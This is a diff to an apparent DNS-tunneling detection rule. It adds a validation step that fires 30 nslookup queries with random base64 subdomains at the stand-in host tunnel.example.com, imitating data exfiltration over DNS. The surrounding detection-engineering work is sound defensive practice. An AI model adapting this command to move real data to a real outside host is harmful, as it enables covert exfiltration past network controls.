@@ -20,6 +20,10 @@ detection:
   count: 10
   groupby: host
   condition: selection
+validation:
+  atomic: T1071.004
+  fire: |-
+    for i in $(seq 1 30); do nslookup $(head -c 40 /dev/urandom | base64 | tr -d '=+/').tunnel.example.com; done
 falsepositives:
   - CDN, antivirus reputation lookups and some cloud telemetry
 level: medium
